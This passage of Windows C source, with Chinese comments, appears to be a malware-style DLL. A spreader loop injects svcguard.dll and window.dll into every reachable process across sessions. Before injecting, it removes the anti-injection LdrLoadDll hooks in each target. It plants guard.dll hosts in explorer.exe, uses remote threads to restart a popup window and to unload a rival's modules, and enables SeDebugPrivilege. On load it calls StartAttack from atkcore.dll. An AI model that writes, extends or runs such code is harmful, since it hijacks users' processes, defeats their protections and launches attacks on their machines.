        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (hSnap == INVALID_HANDLE_VALUE) break;
        if (Process32FirstW(hSnap, &pe)) {
            do {
                BOOL bExplorer = (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0);
                BOOL bDup = FALSE;
                int k;

                if (g_guardCount + nCand >= GUARD_HOST_MAX) break;
                if (pass == 0 && !bExplorer) continue;
                if (pass == 1 && bExplorer) continue;
                if (pe.th32ProcessID == GetCurrentProcessId()) continue;
                if (IsProtected(pe.szExeFile)) continue;
                if (GuardHostKnown(pe.th32ProcessID)) continue;
                for (k = 0; k < nCand; k++)
                    if (cand[k] == pe.th32ProcessID) bDup = TRUE;
                if (bDup) continue;
                if (!IsSameSession(pe.th32ProcessID)) continue;
                cand[nCand++] = pe.th32ProcessID;
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    for (i = 0; i < nCand; i++) {
        HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                   PROCESS_VM_READ | PROCESS_QUERY_INFORMATION |
                                   PROCESS_DUP_HANDLE, FALSE, cand[i]);
        BOOL bDupOk = (hProc != NULL);
        BOOL bCanRead = (hProc != NULL);
        if (!hProc)
            hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, cand[i]);
        if (!hProc) continue;
        if (bCanRead) RepairTargetLdrHook(hProc, cand[i]);

        if (InjectDll(hProc, g_szGuardDllPath, cand[i])) {
            if (bDupOk) PublishGuardHandle(hProc, cand[i]);
            if (g_guardCount < GUARD_HOST_MAX) g_guardPids[g_guardCount++] = cand[i];
            WriteDeamonLog(L"guard.dll 已部署到宿主 PID=%lu（句柄%ls）\n",
                           cand[i], bDupOk ? L"已登记" : L"未登记");
        }
        CloseHandle(hProc);
    }
}

/* 弹窗线程可能被 TerminateThread 或已自行退出，而模块还留在宿主里 ——
   注入方看到模块在，不会重新注入，弹窗就永远回不来。这里用"远程线程调用
   window.dll!StartWindow"把它重新拉起来：RVA 用本进程 window.dll 的地址算，
   宿主里的必须是同一个文件（全路径比对）才敢用。 */
static void ForceWindowRestartInHosts(void) {
    HMODULE hLocalWin = GetModuleHandleW(L"window.dll");
    WCHAR localPath[MAX_PATH] = L"";
    ULONG_PTR rva;
    FARPROC pfn;
    HANDLE hSnap;
    PROCESSENTRY32W pe = { sizeof(pe) };
    int done = 0;

    /* 不限定"必须跑在 xx 内"：任何装着同一份 window.dll 的宿主都能做这件事，
       冗余越高越不容易出现"弹窗再也回不来"。 */

    if (!hLocalWin) {
        if (g_szWindowDllPath[0] == L'\0' && !InitPaths()) return;
        hLocalWin = LoadLibraryW(g_szWindowDllPath);
        if (!hLocalWin) return;
    }
    pfn = GetProcAddress(hLocalWin, "StartWindow");
    if (!pfn) return;
    if (!GetModuleFileNameW(hLocalWin, localPath, MAX_PATH)) return;
    rva = (ULONG_PTR)pfn - (ULONG_PTR)hLocalWin;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            HANDLE hProc;
            HMODULE mods[1024];
            DWORD needed = 0;
            ULONG_PTR remoteWin = 0;

            if (done >= 2) break;             /* 两个宿主的冗余足够 */
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            if (IsProtected(pe.szExeFile)) continue;
            if (!IsSameSession(pe.th32ProcessID)) continue;

            hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
                DWORD count = needed / sizeof(HMODULE);
                for (DWORD k = 0; k < count; k++) {
                    WCHAR name[MAX_PATH];
                    if (GetModuleFileNameExW(hProc, mods[k], name, MAX_PATH) &&
                        _wcsicmp(name, localPath) == 0) {
                        remoteWin = (ULONG_PTR)mods[k];
                        break;
                    }
                }
            }
            if (remoteWin) {
                HANDLE h = CreateRemoteThread(hProc, NULL, 0,
                                              (LPTHREAD_START_ROUTINE)(remoteWin + rva),
                                              NULL, 0, NULL);
                if (h) {
                    WaitForSingleObject(h, 1000);
                    CloseHandle(h);
                    done++;
                    WriteDeamonLog(L"已远程重新拉起弹窗线程 PID=%lu\n", pe.th32ProcessID);
                }
            }
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static DWORD WINAPI SpreaderThread(LPVOID lp) {
    BOOL bImXx;
    DWORD dwGuardScan = 0;
    DWORD dwStatTick = 0;
    int nSeen = 0, nInj = 0, nOpenFail = 0, nInjLog = 0;

    UNREFERENCED_PARAMETER(lp);
    Sleep(5000);
    if (!g_pSharedView) OpenSharedMemory();
    InitPaths();
    bImXx = IsRunningInXxExe();
    if (bImXx) WriteDeamonLog(L"本实例在 xx.exe 内，负责部署 guard.dll 宿主\n");
    {
        DWORD sid = 0;
        ProcessIdToSessionId(GetCurrentProcessId(), &sid);
        WriteDeamonLog(L"扩散自检: session=%lu xx=%ls\n", sid, g_szXxExePath);
    }

    while (!g_bExitFlag) {
        InjCacheRefreshIfDue();
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    if (IsProtected(pe.szExeFile)) continue;
                    if (pe.th32ProcessID <= 4) continue;      /* System / Idle：OpenProcess 必失败 */
                    /* 不按会话过滤：弹窗锁是 Local\，别的会话里的 window.dll 抢不到
                       本会话的锁，所以在别的会话扩散没有副作用；反过来若在这里过滤，
                       一旦 xx 与目标进程会话不一致（服务/SYSTEM 启动、RDP 等），
                       就会一个进程都注入不进去 —— 那才是"别的进程里没有 dll"的元凶。 */
                    nSeen++;
                    if (InjCacheHas(pe.th32ProcessID)) continue;
                    if (RejectedRecently(pe.th32ProcessID)) continue;   /* 反复拒绝的目标别再刷 */
                    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                               PROCESS_VM_WRITE | PROCESS_VM_READ |
                                               PROCESS_QUERY_INFORMATION,
                                               FALSE, pe.th32ProcessID);
                    BOOL bCanRead = (hProc != NULL);
                    if (!hProc)
                        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                            PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                                            FALSE, pe.th32ProcessID);
                    if (!hProc) {
                        nOpenFail++;
                        if (nOpenFail <= 5)   /* 只报前几条，避免刷屏 */
                            WriteDeamonLog(L"OpenProcess 失败 PID=%lu %ls err=%lu\n",
                                           pe.th32ProcessID, pe.szExeFile, GetLastError());
                        InjCacheAdd(pe.th32ProcessID);
                        continue;
                    }
                    /* 32 位进程装不了 64 位 dll：直接跳过，别每秒重试一次 */
                    {
                        BOOL bWow64 = FALSE;
                        if (IsWow64Process(hProc, &bWow64) && bWow64) {
                            MarkRejected(pe.th32ProcessID);
                            WriteDeamonLog(L"跳过 32 位进程 PID=%lu %ls\n",
                                           pe.th32ProcessID, pe.szExeFile);
                            CloseHandle(hProc);
                            continue;
                        }
                    }
                    /* 注入前先拆掉目标里可能存在的 LdrLoadDll 反注入 hook */
                    if (bCanRead) RepairTargetLdrHook(hProc, pe.th32ProcessID);

                    BOOL hasDeamon = FALSE, hasWindow = FALSE;
                    HMODULE mods[1024];
                    DWORD needed;
                    if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
                        DWORD count = needed / sizeof(HMODULE);
                        for (DWORD i = 0; i < count; i++) {
                            WCHAR name[MAX_PATH];
                            if (GetModuleFileNameExW(hProc, mods[i], name, MAX_PATH)) {
                                if (!hasDeamon && wcsstr(name, L"svcguard.dll")) hasDeamon = TRUE;
                                else if (!hasWindow && wcsstr(name, L"window.dll")) hasWindow = TRUE;
                            }
                        }
                    }
                    if (!hasDeamon) {
                        if (InjectDll(hProc, g_szDeamonDllPath, pe.th32ProcessID)) {
                            nInj++;
                            if (nInjLog < 12) { nInjLog++; WriteDeamonLog(L"已注入 svcguard.dll -> PID=%lu %ls\n", pe.th32ProcessID, pe.szExeFile); }
                        } else {
                            MarkRejected(pe.th32ProcessID);
                        }
                    }
                    if (!hasWindow) {
                        if (InjectDll(hProc, g_szWindowDllPath, pe.th32ProcessID)) {
                            nInj++;
                            if (nInjLog < 12) { nInjLog++; WriteDeamonLog(L"已注入 window.dll -> PID=%lu %ls\n", pe.th32ProcessID, pe.szExeFile); }
                        } else {
                            MarkRejected(pe.th32ProcessID);
                        }
                    }
                    InjCacheAdd(pe.th32ProcessID);
                    CloseHandle(hProc);
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }

        /* 每 10 秒报一次扩散统计：拿不到弹窗日志时也能一眼看出注入是否发生 */
        {
            DWORD now = GetTickCount();
            if (dwStatTick == 0 || now - dwStatTick >= 10000) {
                WriteDeamonLog(L"扩散统计(10s): 扫描(进程×轮)=%d 注入成功=%d OpenProcess失败=%d\n",
                               nSeen, nInj, nOpenFail);
                dwStatTick = now;
                nSeen = nInj = nOpenFail = 0;
            }
        }

        if (bImXx) {
            DWORD now = GetTickCount();
            if (dwGuardScan == 0 || now - dwGuardScan >= INJ_REFRESH_MS) {
                dwGuardScan = now;
                ValidateGuardHosts();
                EnsureGuardHosts();
            }
        }
        Sleep(500);
    }
    return 0;
}

/* 卸载对手注入的 guard.dll：只保留与我方同目录的那一份 */
static void UnloadForeignGuardPass(void)
{
    WCHAR ourGuard[MAX_PATH] = L"";
    WCHAR dllPath[MAX_PATH];
    if (GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dllPath, MAX_PATH)) {
        WCHAR *ps = wcsrchr(dllPath, L'\\');
        if (ps) ps[1] = L'\0';
        swprintf_s(ourGuard, MAX_PATH, L"%sguard.dll", dllPath);
    }

    FARPROC pFreeLib = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "FreeLibrary");
    if (!pFreeLib) return;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (IsProtected(pe.szExeFile)) continue;
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                       PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                                       FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HMODULE mods[1024];
            DWORD needed = 0;
            if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
                DWORD count = needed / sizeof(HMODULE);
                for (DWORD i = 0; i < count; i++) {
                    WCHAR modPath[MAX_PATH];
                    if (!GetModuleFileNameExW(hProc, mods[i], modPath, MAX_PATH)) continue;
                    const WCHAR *base = wcsrchr(modPath, L'\\');
                    base = base ? base + 1 : modPath;
                    if (_wcsicmp(base, L"guard.dll") != 0) continue;
                    if (ourGuard[0] && _wcsicmp(modPath, ourGuard) == 0) continue;
                    HANDLE h = CreateRemoteThread(hProc, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)pFreeLib, mods[i], 0, NULL);
                    if (h) {
                        WaitForSingleObject(h, 1000);
                        CloseHandle(h);
                        WriteDeamonLog(L"卸载外来 guard.dll: PID=%lu %ls\n", pe.th32ProcessID, modPath);
                    }
                }
            }
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static DWORD WINAPI UnloadForeignGuardThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    Sleep(3000);
    while (!g_bExitFlag) {
        UnloadForeignGuardPass();
        Sleep(2000);
    }
    return 0;
}

static void StartRemoteAttack(void)
{
    WCHAR dir[MAX_PATH], path[MAX_PATH];
    if (!GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dir, MAX_PATH))
        return;
    WCHAR *pSlash = wcsrchr(dir, L'\\');
    if (pSlash) *(pSlash + 1) = L'\0';
    else return;
    swprintf_s(path, MAX_PATH, L"%satkcore.dll", dir);
    HMODULE hKill = LoadLibraryW(path);
    if (!hKill) {
        WriteDeamonLog(L"加载 atkcore.dll 失败: %ls err=%lu\n", path, GetLastError());
        return;
    }
    WriteDeamonLog(L"加载 atkcore.dll 成功: %ls\n", path);
    typedef void (WINAPI *StartAttack_t)(void);
    StartAttack_t pStart = (StartAttack_t)GetProcAddress(hKill, "StartAttack");
    if (pStart) {
        pStart();
        WriteDeamonLog(L"StartAttack 已调用\n");
    } else {
        WriteDeamonLog(L"StartAttack 导出未找到\n");
    }
}

static DWORD WINAPI BootThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    StartRemoteAttack();
    return 0;
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ================== */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

__declspec(dllexport) void WINAPI DeamonInit(void)
{
    BOOL bPriv = EnableDebugPrivilege();
    DWORD sid = 0;
    /* xx.exe 自身的 DACL 会拒绝 Everyone（连自己都打不开），在它进程里
       ProcessIdToSessionId(自己) 会失败并给 0；所以优先读共享内存里记的会话号 */
    if (g_pSharedView) sid = (DWORD)XX_SESSION(g_pSharedView);
    if (sid == 0) ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    WriteDeamonLog(L"DeamonInit: pid=%lu session=%lu SeDebugPrivilege=%ls\n",
                   GetCurrentProcessId(), sid, bPriv ? L"ON" : L"OFF");
    CreateThread(NULL, 0, HeartbeatMonitor, NULL, 0, NULL);
    CreateThread(NULL, 0, SpreaderThread, NULL, 0, NULL);
    CreateThread(NULL, 0, OwnFileShieldThread, NULL, 0, NULL);
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinst);
        CreateThread(NULL, 0, BootThread, NULL, 0, NULL);
        CreateThread(NULL, 0, UnloadForeignGuardThread, NULL, 0, NULL);
    }
    return TRUE;
}
